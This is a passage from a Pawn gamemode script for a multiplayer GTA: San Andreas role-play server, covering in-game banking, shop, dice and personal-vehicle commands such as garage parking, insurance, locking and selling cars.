                format(string, sizeof(string), "New Balance: $%s", FormatNumber(PlayerInfo[playerid][pAccount]));
                SendClientMessage(playerid, COLOR_WHITE, string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD4, "You are not at the Bank!");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/atmwithdraw", true) == 0)
    {
            if(IsPlayerConnected(playerid))
        {
            if(IsAtATMSystem(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /atmwithdraw [amount]");
                    return 1;
                }
                new cashdeposit = strval(tmp);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /atmwithdraw [amount]");
                    return 1;
                }
                if (cashdeposit > PlayerInfo[playerid][pAccount] || cashdeposit < 1)
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "You dont have that much.");
                    return 1;
                }
                TogglePlayerControllable(playerid, 0);
                UseAtm[playerid] = 1;
                LoopingAnim(playerid,"PED","ATM",4.1,0,0,0,0,0);
                GivePlayerPool(playerid,cashdeposit);
                PlayerInfo[playerid][pAccount]=PlayerInfo[playerid][pAccount]-cashdeposit;
                SaveKonVal(playerid, "pAccount", PINFO[playerid][pAccount]);
                format(string, sizeof(string), "You have withdrawn $%s from your account, Total: $%s ", FormatNumber(cashdeposit),FormatNumber(PlayerInfo[playerid][pAccount]));
                SendClientMessage(playerid, COLOR_YELLOW, string);
                return 1;
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not at a ATM !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/transfer", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pLevel] < 5)
            {
                SendClientMessage(playerid, COLOR_GRAD1, "** You must be level 5 !");
                return 1;
            }
            if(!IsAtBankk(playerid))
            {
                SendClientMessage(playerid, COLOR_GREY,"** You are not at the Bank !");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /transfer [playerid/PartOfName] [amount]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /transfer [playerid/PartOfName] [amount]");
                return 1;
            }
            moneys = strval(tmp);
            if (IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    playermoney = PlayerInfo[playerid][pAccount] ;
                    if (moneys > 0 && playermoney >= moneys)
                    {
                        PlayerInfo[playerid][pAccount] -= moneys;
                        SaveKonVal(playerid, "pAccount", PINFO[playerid][pAccount]);
                        PlayerInfo[giveplayerid][pAccount] += moneys;
                        SaveKonVal(giveplayerid, "pAccount", PINFO[giveplayerid][pAccount]);
                        format(string, sizeof(string), "** You have transferd $%s to %s's account", FormatNumber(moneys), giveplayer,giveplayerid);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        format(string, sizeof(string), "** You have recieved $%s to into your account from %s", FormatNumber(moneys), sendername, playerid);
                        SendClientMessage(giveplayerid, COLOR_GRAD1, string);
                        format(string, sizeof(string), "%s transferd $%s to %s", sendername, FormatNumber(moneys), giveplayer);
                        if(moneys >= 5000)
                        {
                            ABroadCast(COLOR_YELLOW,string,1);
                        }
                        printf("%s", string);
                        PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GRAD1, "   Invalid transaction amount.");
                    }
                }
            }
            else
            {
                format(string, sizeof(string), "that player is offline.");
                SendClientMessage(playerid, COLOR_GRAD1, string);
            }
        }
        return 1;
    }

    if(strcmp(cmd, "/atransfer", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] <= 2)
            {
            SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use that command.");
            return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /transfer [playerid/PartOfName] [amount]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /transfer [playerid/PartOfName] [amount]");
                return 1;
            }
            moneys = strval(tmp);
            if (IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    playermoney = PlayerInfo[playerid][pAccount] ;
                    if (moneys > 0 && playermoney >= moneys)
                    {
                        PlayerInfo[playerid][pAccount] -= moneys;
                        SaveKonVal(playerid, "pAccount", PINFO[playerid][pAccount]);
                        PlayerInfo[giveplayerid][pAccount] += moneys;
                        SaveKonVal(giveplayerid, "pAccount", PINFO[giveplayerid][pAccount]);
                        format(string, sizeof(string), "** You have transferd $%s to %s's account", FormatNumber(moneys), giveplayer,giveplayerid);
                        PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                        SendClientMessage(playerid, COLOR_GRAD1, string);
                        format(string, sizeof(string), "** You have recieved $%s to into your account from %s", FormatNumber(moneys), sendername, playerid);
                        SendClientMessage(giveplayerid, COLOR_GRAD1, string);
                        format(string, sizeof(string), "%s transferd $%s to %s", sendername, FormatNumber(moneys), giveplayer);
                        if(moneys >= 5000)
                        {
                            ABroadCast(COLOR_YELLOW,string,1);
                        }
                        printf("%s", string);
                        PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GRAD1, "   Invalid transaction amount.");
                    }
                }
            }
            else
            {
                format(string, sizeof(string), "that player is offline.");
                SendClientMessage(playerid, COLOR_GRAD1, string);
            }
        }
        return 1;
    }

    if(strcmp(cmd, "/balance", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAtBankk(playerid))
            {
                format(string, sizeof(string), "  You Have $%s in your account.",FormatNumber(PlayerInfo[playerid][pAccount]));
                SendClientMessage(playerid, COLOR_YELLOW, string);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not at the Bank !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/dice", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new dice = random(6)+1;
            if (gDice[playerid] == 1)
            {
                GetPlayerName(playerid, sendername, sizeof(sendername));
                format(string, sizeof(string), "%s throws a dice that lands on %d.", sendername,dice);
                ProxDetector(20.0, playerid, string, COLOR_WHITE,COLOR_WHITE,COLOR_WHITE,COLOR_WHITE,COLOR_WHITE);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD2, "You haven't a Dice.");
                return 1;
            }
        }
        return 1;
    }
/*----------------------------------------------------------------------------*/
    if(strcmp(cmd, "/buy", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (!PlayerToPoint(100, playerid,-30.875, -88.9609, 1004.53))//centerpoint 24-7
            {
                SendClientMessage(playerid, COLOR_GRAD2, "You are not in a 24-7");
                return 1;
            }
            new buyabler[400];
            format(buyabler,sizeof(buyabler),"Cell Phone \t\t$50\nStratch Card \t\t$5\nPhone Book \t\t$1\nDice \t\t\t$1\nGas can \t\t$75\nCamera \t\t$25\nLighter \t\t\t$1\nCigarettes \t\t$1\nWalkieTalkie \t\t$5");
            ShowPlayerDialog(playerid,259,DIALOG_STYLE_LIST,"Chose what do you want to buy:",buyabler,"Buy","Cancel");
        }
        return 1;
    }
//-----------------------------------------------------------------------------------------
    if(strcmp(cmd, "/carhelp", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            SCM(playerid, CRISTIAN,"_______________________________________");
            SCM(playerid, COLOR_WHITE,"*** CAR HELP *** type a command for more help");
            SCM(playerid, COLOR_GRAD3,"*** CAR ***  /park, /lock, /sellcarto, /locatecar, /towcar, /gpark,");
            SCM(playerid, COLOR_GRAD3,"*** CAR ***  /carinfo, /carplate, /givekey, /changelock, /removetuning,");
            SCM(playerid, COLOR_GRAD3,"*** CAR *** /sellcar, /buycar, /buyinsurance, /carcolor, /gget");
            return 1;
        }
    }
    if(!strcmp(cmd,"/gget",true))
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
        new ho = PINFO[playerid][pPhousekey];
        if(ho == 9999) return SCM(playerid,COLOR_ALI,"You don't buy/rent a house.");
        new Float:ui[3];
        GetPlayerPos(playerid, ui[0], ui[1], ui[2]);
        if(!IsPlayerInRangeOfPoint(playerid, 50, HouseInfo[ho][hExitx], HouseInfo[ho][hExity], HouseInfo[ho][hExitz])) return SCM(playerid,COLOR_ALI,"You must be near your house to get your vehicle.");
        if(PINFO[playerid][gParked] == 1 && PINFO[playerid][gParked_2] == 1)
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /gget <CarID(1 or 2)>");
            new mashin = strval(tmp);
            if(mashin == 1)
            {
                CreateVehGarage(playerid);
                GameTextForPlayer(playerid, "vehicle ~n~~w~has evicted from the garage", 5000, 1);
                return 1;
            }
            else if(mashin == 2)
            {
                CreateVehGarage_2(playerid);
                GameTextForPlayer(playerid, "vehicle ~n~~w~has evicted from the garage", 5000, 1);
                return 1;
            }
            else return SCM(playerid,COL_SYN,"Syntax: /gget <CarID(1 or 2)>");
        }
        else if(PINFO[playerid][gParked] == 1 && PINFO[playerid][gParked_2] == 0)
        {
                CreateVehGarage(playerid);
                GameTextForPlayer(playerid, "vehicle ~n~~w~has evicted from the garage", 5000, 1);
                return 1;
        }
        else if(PINFO[playerid][gParked] == 0 && PINFO[playerid][gParked_2] == 1)
        {
                CreateVehGarage_2(playerid);
                GameTextForPlayer(playerid, "vehicle ~n~~w~has evicted from the garage", 5000, 1);
                return 1;
        }
        return SCM(playerid,COLOR_Good,"Your car isn't in the garage.");
    }
    if(!strcmp(cmd,"/gpark",true))
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
        new veh = GetPlayerVehicleID(playerid);
        new mashin;
        if(veh != PINFO[playerid][pCar] && veh != PINFO[playerid][pCar_2]) return SCM(playerid,COL_SYN,"You must be in your vehicle to park it on garage.");
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid,COL_SYN,"You must be driver of your car to park it in garage.");
        if(veh == PINFO[playerid][pCar]) mashin = 1;
        else mashin = 2;
        new ho = PINFO[playerid][pPhousekey];
        if(ho == 9999) return SCM(playerid,COLOR_ALI,"You don't buy/rent a house.");
        new Float:ui[3];
        GetVehiclePos(GetPlayerVehicleID(playerid), ui[0], ui[1], ui[2]);
        if(GetVehicleDistanceFromPoint(veh, HouseInfo[ho][hExitx], HouseInfo[ho][hExity], HouseInfo[ho][hExitz]) > 50) return SCM(playerid,COLOR_ALI,"You must be near your house to park your car on garage.");
        new Float:vh;GetVehicleHealth(veh,vh);
        if(vh < 249.9) return SCM(playerid,COLOR_ALI,"You cannot do it now.");
        if(mashin == 1)
        {
            new Float:a;
            GetVehicleZAngle(veh, a);
            GetVehicleDamageStatus(veh,PINFO[playerid][cPanel],PINFO[playerid][cDoors],PINFO[playerid][cLights],PINFO[playerid][cTires]);
            SaveKonVal(playerid, "cPanel", PINFO[playerid][cPanel]);
            SaveKonVal(playerid, "cDoors", PINFO[playerid][cDoors]);
            SaveKonVal(playerid, "cLights", PINFO[playerid][cLights]);
            SaveKonVal(playerid, "cTires", PINFO[playerid][cTires]);
            PlayerInfo[playerid][cHealth] = vh;
            SaveKonFloat(playerid, "cHealth", vh);
            PlayerInfo[playerid][gLocationX] = ui[0];
            SaveKonFloat(playerid, "gLocationX", ui[0]);
            PlayerInfo[playerid][gLocationY] = ui[1];
            SaveKonFloat(playerid, "gLocationY", ui[1]);
            PlayerInfo[playerid][gLocationZ] = ui[2];
            SaveKonFloat(playerid, "gLocationZ", ui[2]);
            PlayerInfo[playerid][gAngle] = a;
            SaveKonFloat(playerid, "gAngle", a);
            PINFO[playerid][gParked] = 1;
            SaveKonVal(playerid, "gParked", 1);
            GameTextForPlayer(playerid, "vehicle ~n~~w~has parked in the garage", 5000, 1);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            MashinOwner[veh] = 9999;
            DestroyVehicle(veh, true);
            OwnedMashin[veh] = 0;
        }
        else if(mashin == 2)
        {
            new Float:a;
            GetVehicleZAngle(veh, a);
            GetVehicleDamageStatus(veh,PINFO[playerid][cPanel_2],PINFO[playerid][cDoors_2],PINFO[playerid][cLights_2],PINFO[playerid][cTires_2]);
            SaveKonVal(playerid, "cPanel_2", PINFO[playerid][cPanel_2]);
            SaveKonVal(playerid, "cDoors_2", PINFO[playerid][cDoors_2]);
            SaveKonVal(playerid, "cLights_2", PINFO[playerid][cLights_2]);
            SaveKonVal(playerid, "cTires_2", PINFO[playerid][cTires_2]);
            PlayerInfo[playerid][cHealth_2] = vh;
            SaveKonFloat(playerid, "cHealth_2", vh);
            PlayerInfo[playerid][gLocationX_2] = ui[0];
            SaveKonFloat(playerid, "gLocationX_2", ui[0]);
            PlayerInfo[playerid][gLocationY_2] = ui[1];
            SaveKonFloat(playerid, "gLocationY_2", ui[1]);
            PlayerInfo[playerid][gLocationZ_2] = ui[2];
            SaveKonFloat(playerid, "gLocationZ_2", ui[2]);
            PlayerInfo[playerid][gAngle_2] = a;
            SaveKonFloat(playerid, "gAngle_2", a);
            PINFO[playerid][gParked_2] = 1;
            SaveKonVal(playerid, "gParked_2", 1);
            GameTextForPlayer(playerid, "vehicle ~n~~w~has parked in the garage", 5000, 1);
            PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
            MashinOwner_2[veh] = 9999;
            DestroyVehicle(veh, true);
            OwnedMashin_2[veh] = 0;
        }
        return 1;
    }
    if(!strcmp(cmd,"/buyinsurance",true))
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a Personal Car.");
        tmp = strtok(cmdtext,idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /buyinsurance <CarID(1 or 2)> <Amount>");
        new CarrID = strval(tmp);
        if(CarrID != 1 && CarrID != 2) return SCM(playerid,COL_SYN,"Invalid CarID.");
        if(CarrID == 1)
        {
            if(PINFO[playerid][cInsurance] >= 5) return SCM(playerid,COLOR_ALI,"You cant buy more than 5 insurances");
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /buyinsurance <CarID(1 or 2)> <Amount>");
            new insur = strval(tmp);
            if(insur > 5-PINFO[playerid][cInsurance] || insur <= 0)
            {
                new limitstr[128];
                format(limitstr, 128, "Type a number between 1 and %i.", 5-PINFO[playerid][cInsurance]);
                return SCM(playerid,COLOR_ALI, limitstr);
            }
            PlayerInfo[playerid][cInsurance] += insur;
            SaveKonVal(playerid, "cInsurance", PINFO[playerid][cInsurance]);
            new strlol[512];
            new pricee = (insur*PlayerInfo[playerid][cPrice]*1/500);
            if(GetPlayerPool(playerid) < pricee) { format(strlol,512,"Shoma Pool Kafi Nadarid(+$%s)",FormatNumber(pricee)); return SCM(playerid,COLOR_ALI,strlol); }
            GivePlayerPool(playerid,-pricee);
            format(strlol,512,"You buy %i insurances for your vehicle for $%s.",insur,FormatNumber(pricee));
            SCM(playerid,COLOR_ROUZ,strlol);
            return 1;
        }
        else if(CarrID == 2)
        {
            if(PINFO[playerid][cInsurance_2] >= 5) return SCM(playerid,COLOR_ALI,"You cant buy more than 5 insurances");
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /buyinsurance <CarID(1 or 2)> <Amount>");
            new insur = strval(tmp);
            if(insur > 5-PINFO[playerid][cInsurance_2] || insur <= 0)
            {
                new limitstr[128];
                format(limitstr, 128, "Type a number between 1 and %i.", 5-PINFO[playerid][cInsurance_2]);
                return SCM(playerid,COLOR_ALI, limitstr);
            }
            PlayerInfo[playerid][cInsurance_2] += insur;
            SaveKonVal(playerid, "cInsurance_2", PINFO[playerid][cInsurance_2]);
            //SaveAccount(playerid);
            new strlol[512];
            new pricee = (insur*PlayerInfo[playerid][cPrice_2]*1/500);
            if(GetPlayerPool(playerid) < pricee) { format(strlol,512,"Shoma Pool Kafi Nadarid(+$%s)",FormatNumber(pricee)); return SCM(playerid,COLOR_ALI,strlol); }
            GivePlayerPool(playerid,-pricee);
            format(strlol,512,"You buy %i insurances for your vehicle for $%s.",insur,FormatNumber(pricee));
            SCM(playerid,COLOR_ROUZ,strlol);
            return 1;
        }
    }
/*----------------------------------------------------------------------------*/
    if (strcmp(cmd, "/carinfo", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pCar] != 0 && PINFO[playerid][pCar_2] == 0)
            {
                ShowCarInfo(playerid, playerid, 1);
                return 1;
            }
            else if(PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] != 0)
            {
                tmp = strtok(cmdtext,idx);
                if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /carinfo <CarID(1 or 2)>");
                new cca = strval(tmp);
                if(cca != 1 && cca != 2) return SCM(playerid,COLOR_ALI,"Invalid CarID.");
                ShowCarInfo(playerid, playerid, cca);
                return 1;
            }
            else if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] != 0)
            {
                ShowCarInfo(playerid, playerid, 2);
                return 1;
            }
        }
        return 1;
    }
/*------------------------------------Lock------------------------------------*/
        if(strcmp(cmd, "/lock", true) == 0 || strcmp(cmd, "/n", true) == 0)
    {
        new alich = GetNearestVehicle(playerid, 10.0);
        if(alich == INVALID_VEHICLE_ID)
        {
            SCM(playerid,COLOR_ALI,"There is no vehicle or You haven't key of this vehicle.");
            return 1;
        }
        if(OwnedMashin[alich] == 1 && PlayerInfo[MashinOwner[alich]][cLock] == 1 && (PlayerInfo[playerid][pCar] == alich || IHaveKey[playerid] == alich))
        {
            new vehicles = GetVehicleModel(alich) - 400;
            new ali[256];
            format(ali,sizeof(ali),"~w~%s ~g~Unlocked",aVehicleNames[vehicles]);
            for(new i=0; i < LastPID; i++)
            {
                SetVehicleParamsForPlayer(alich,i,0,0);
            }
            GameTextForPlayer(playerid, ali, 4000, 3);
            PlayerInfo[MashinOwner[alich]][cLock] = 0;
            SaveKonVal(MashinOwner[alich], "cLock", 0);
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            PlayerPlaySound(playerid,1056,X,Y,Z);
            //SaveAccount(MashinOwner[alich]);
            return 1;
        }
        else if(OwnedMashin[alich] == 1 && PlayerInfo[MashinOwner[alich]][cLock] == 0 && (PlayerInfo[playerid][pCar] == alich || IHaveKey[playerid] == alich))
        {
            new vehicles = GetVehicleModel(alich) - 400;
            new ali[256];
            format(ali,sizeof(ali),"~w~%s ~r~Locked",aVehicleNames[vehicles]);
            for(new i=0; i < LastPID; i++)
            {
                SetVehicleParamsForPlayer(alich,i,0,1);
            }
            GameTextForPlayer(playerid, ali, 4000, 3);
            PlayerInfo[MashinOwner[alich]][cLock] = 1;
            SaveKonVal(MashinOwner[alich], "cLock", 1);
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            PlayerPlaySound(playerid,1056,X,Y,Z);
            //SaveAccount(MashinOwner[alich]);
            return 1;
        }
        else if(OwnedMashin_2[alich] == 1 && PINFO[MashinOwner_2[alich]][cLock_2] == 1 && (PINFO[playerid][pCar_2] == alich || IHaveKey_2[playerid] == alich))
        {
            new vehicles = GetVehicleModel(alich) - 400;
            new ali[256];
            format(ali,sizeof(ali),"~w~%s ~g~Unlocked",aVehicleNames[vehicles]);
            for(new i=0; i < LastPID; i++)
            {
                SetVehicleParamsForPlayer(alich,i,0,0);
            }
            GameTextForPlayer(playerid, ali, 4000, 3);
            PlayerInfo[MashinOwner_2[alich]][cLock_2] = 0;
            SaveKonVal(MashinOwner_2[alich], "cLock_2", 0);
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            PlayerPlaySound(playerid,1056,X,Y,Z);
            //SaveAccount(MashinOwner_2[alich]);
        }
        else if(OwnedMashin_2[alich] == 1 && PlayerInfo[MashinOwner_2[alich]][cLock_2] == 0 && (PlayerInfo[playerid][pCar_2] == alich || IHaveKey_2[playerid] == alich))
        {
            new vehicles = GetVehicleModel(alich) - 400;
            new ali[256];
            format(ali,sizeof(ali),"~w~%s ~r~Locked",aVehicleNames[vehicles]);
            for(new i=0; i < LastPID; i++)
            {
                SetVehicleParamsForPlayer(alich,i,0,1);
            }
            GameTextForPlayer(playerid, ali, 4000, 3);
            PlayerInfo[MashinOwner_2[alich]][cLock_2] = 1;
            SaveKonVal(MashinOwner_2[alich], "cLock_2", 1);
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            PlayerPlaySound(playerid,1056,X,Y,Z);
            //SaveAccount(MashinOwner_2[alich]);
            return 1;
        }
        else if(MashinRenter[alich] != INVALID_PLAYER_ID && RentedVehicle[playerid] == alich && gCarLock[alich] == 0)
        {
            new vehicles = GetVehicleModel(alich) - 400;
            format(string, sizeof(string), "~w~%s Rent ~r~Locked", aVehicleNames[vehicles]);
            GameTextForPlayer(playerid, string, 4000, 3);
            PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
            gCarLock[alich] = 1;
            for(new i=0; i < LastPID; i++)
            {
                SetVehicleParamsForPlayer(alich,i,0,1);
            }
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            PlayerPlaySound(playerid,1056,X,Y,Z);
            return 1;
        }
        else if(MashinRenter[alich] != INVALID_PLAYER_ID && RentedVehicle[playerid] == alich && gCarLock[alich] == 1)
        {
            new vehicles = GetVehicleModel(alich) - 400;
            format(string, sizeof(string), "~w~%s Rent ~g~UnLocked", aVehicleNames[vehicles]);
            GameTextForPlayer(playerid, string, 4000, 3);
            PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
            gCarLock[alich] = 0;
            for(new i=0; i < LastPID; i++)
            {
                SetVehicleParamsForPlayer(alich,i,0,0);
            }
            new Float:X,Float:Y,Float:Z;
            GetPlayerPos(playerid,X,Y,Z);
            PlayerPlaySound(playerid,1056,X,Y,Z);
            return 1;
        }
        else
        {
            SCM(playerid,COLOR_ALI,"There is no vehicle or You haven't key of this vehicle.");
            return 1;
        }
        return 1;
    }
    if(strcmp(cmd,"/changelock",true)==0)
    {
        if(PINFO[playerid][pCar] != 0 && PINFO[playerid][pCar_2] != 0)
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /changelock <CarID(1 or 2)");
            new carid = strval(tmp);
            if(carid != 1 && carid != 2) return SCM(playerid,COLOR_ALI,"Invalid carid.");
            if(carid == 1)
            {
                if(KeyDade[playerid] != 9999 && IsPlayerConnected(KeyDade[playerid]))
                {
                    IHaveKey[KeyDade[playerid]] = 0;
                    SCM(KeyDade[playerid],COLOR_ALI,"owner of vehicle changed the lock and you losted your key(CarID: 1)");
                    KeyDade[playerid] = 9999;
                    SCM(playerid,COLOR_ALI,"You change your vehicle lock.");
                    return 1;
                }
                else
                {
                    SCM(playerid,COLOR_ALI,"You change your vehicle lock.");
                    return 1;
                }
            }
            if(carid == 2)
            {
                if(KeyDade_2[playerid] != 9999 && IsPlayerConnected(KeyDade_2[playerid]))
                {
                    IHaveKey_2[KeyDade_2[playerid]] = 0;
                    SCM(KeyDade_2[playerid],COLOR_ALI,"owner of vehicle changed the lock and you losted your key(CarID: 2)");
                    KeyDade_2[playerid] = 9999;
                    SCM(playerid,COLOR_ALI,"You change your vehicle lock.");
                    return 1;
                }
                else
                {
                    SCM(playerid,COLOR_ALI,"You change your vehicle lock.");
                    return 1;
                }
             }
        }
        else if(PINFO[playerid][pCar] != 0)
        {
            if(KeyDade[playerid] != 9999 && IsPlayerConnected(KeyDade[playerid]))
            {
                IHaveKey[KeyDade[playerid]] = 0;
                SCM(KeyDade[playerid],COLOR_ALI,"owner of vehicle changed the lock and you losted your key(CarID: 1)");
                KeyDade[playerid] = 9999;
                SCM(playerid,COLOR_ALI,"You change your vehicle lock.");
                return 1;
            }
            else
            {
                SCM(playerid,COLOR_ALI,"You change your vehicle lock.");
                return 1;
            }
        }
        else if(PINFO[playerid][pCar_2] != 0)
        {
            if(KeyDade_2[playerid] != 9999 && IsPlayerConnected(KeyDade_2[playerid]))
            {
                IHaveKey_2[KeyDade_2[playerid]] = 0;
                SCM(KeyDade_2[playerid],COLOR_ALI,"owner of vehicle changed the lock and you losted your key(CarID: 2)");
                KeyDade_2[playerid] = 9999;
                SCM(playerid,COLOR_ALI,"You change your vehicle lock.");
                return 1;
            }
            else
            {
                SCM(playerid,COLOR_ALI,"You change your vehicle lock.");
                return 1;
            }
        }
        else
        {
            SCM(playerid,COLOR_ROUZ,"You haven't a Personal car.");
            return 1;
        }
    }
    if(!strcmp(cmd,"/carcolor",true))
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
        if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar])
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /carcolor <ColorID1> <ColorID2>");
            new col1 = strval(tmp);
            if((col1 < 0 || col1 > 128) && PINFO[playerid][pPremiumAccount] == 0) return SCM(playerid,COLOR_ALI,"You must use a ColorID1 between 0 and 128(if you upgrade your account to premium account you can use 0 and 255)");
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /carcolor <ColorID1> <ColorID2>");
            new col2 = strval(tmp);
            if((col2 < 0 || col2 > 128) && PINFO[playerid][pPremiumAccount] == 0) return SCM(playerid,COLOR_ALI,"You must use a ColorID2 between 0 and 128(if you upgrade your account to premium account you can use 0 and 255)");
            if(col1 < 0 || col1 > 255 || col2 < 0 || col2 > 255) return SCM(playerid, COLOR_ALI, "Invalid color id.");
            ChangeVehicleColor(GetPlayerVehicleID(playerid),col1,col2);
            PINFO[playerid][cColor1] = col1;
            SaveKonVal(playerid, "cColor1", col1);
            PINFO[playerid][cColor2] = col2;
            SaveKonVal(playerid, "cColor2", col2);
        }
        else if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar_2])
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /carcolor <ColorID1> <ColorID2>");
            new col1 = strval(tmp);
            if((col1 < 0 || col1 > 128) && PINFO[playerid][pPremiumAccount] == 0) return SCM(playerid,COLOR_ALI,"You must use a ColorID1 between 0 and 128(if you upgrade your account to premium account you can use 0 and 255)");
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /carcolor <ColorID1> <ColorID2>");
            new col2 = strval(tmp);
            if((col2 < 0 || col2 > 128) && PINFO[playerid][pPremiumAccount] == 0) return SCM(playerid,COLOR_ALI,"You must use a ColorID2 between 0 and 128(if you upgrade your account to premium account you can use 0 and 255)");
            if(col1 < 0 || col1 > 255 || col2 < 0 || col2 > 255) return SCM(playerid, COLOR_ALI, "Invalid color id.");
            ChangeVehicleColor(GetPlayerVehicleID(playerid),col1,col2);
            PINFO[playerid][cColor1_2] = col1;
            SaveKonVal(playerid, "cColor1_2", col1);
            PINFO[playerid][cColor2_2] = col2;
            SaveKonVal(playerid, "cColor2_2", col2);
        }
        else return SCM(playerid,COLOR_ALI,"You must sit on your vehicle to change your vehicle color.");
        return 1;
    }
   if (strcmp(cmd, "/sellcarto", true) == 0)
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
        if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar])
        {
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /sellcarto <PlayerID/PartOfName> <Price>");
            new taraf = ReturnUser(tmp);
            if(!IsPlayerConnected(taraf)) return SCM(playerid,COLOR_ALI,"That player is offline.");
            if(!ProxDetectorS(5.0, playerid, taraf)) return SCM(playerid,COLOR_ALI,"You must near this player.");
            if(PINFO[taraf][pLevel] <= 4) return SCM(playerid,COLOR_ALI,"That player must has more than 5 levels.");
            if(PINFO[taraf][pCar] != 0 && PINFO[taraf][pCar_2] != 0) return SCM(playerid,COLOR_ALI,"That player is already has personal car.");
            if(OnSellCar[playerid] == taraf) return SCM(playerid,COLOR_ALI,"You already called for a sellcar to this player, wait for a reply.");
            if(PlayerInfo[taraf][pCar] != 9999 && PlayerInfo[taraf][pPremiumAccount] == 0) return SCM(playerid,COL_SYN,"In Bazikon Baraie Kharid Car2 Baiad Premium Bashad.");
            tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /sellcarto <PlayerID/PartOfName> <Price>");
            new pil = strval(tmp);
